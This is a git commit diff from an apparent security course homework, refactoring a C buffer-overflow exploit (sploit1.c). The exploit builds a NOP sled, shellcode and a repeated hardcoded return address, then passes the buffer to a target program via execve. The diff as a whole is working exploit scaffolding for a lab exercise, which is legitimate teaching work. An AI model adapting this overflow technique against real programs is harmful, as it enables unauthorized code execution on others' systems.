5c8f1ce5ac0d7a254f9198215067fa70e1548f64
justinhalford <justinhalford@gmail.com>
2024-05-10 18:35:43 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -11,34 +11,35 @@ const int BUFFER_SIZE = 409;
 const int SHELLCODE_OFFSET = 201;
 const uint32_t RETURN_ADDRESS = 0xffffdb5c;
 
-void prepareExploit(char *buffer) {
+char* createExploitBuffer() {
+    char *buffer = (char *)malloc(BUFFER_SIZE);
     memset(buffer, 0x90, BUFFER_SIZE - 1);
     memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
 
-    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
+    uint32_t *ptr = (uint32_t *)(buffer + SHELLCODE_OFFSET + sizeof(shellcode) - 1);
+    while ((char *)ptr < buffer + BUFFER_SIZE - 1) {
+        *ptr++ = RETURN_ADDRESS;
     }
 
     buffer[BUFFER_SIZE - 1] = '\0';
+    return buffer;
 }
 
 int main(void)
 {
-    char *args[4];
+    char *args[3];
     char *env[1];
-    char exploitBuffer[BUFFER_SIZE];
-
-    prepareExploit(exploitBuffer);
+    char *exploitBuffer = createExploitBuffer();
 
     args[0] = TARGET;
     args[1] = exploitBuffer;
-    args[2] = "65935";
-    args[3] = NULL;
+    args[2] = NULL;
 
     env[0] = NULL;
 
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
 
+    free(exploitBuffer);
     return 0;
 }
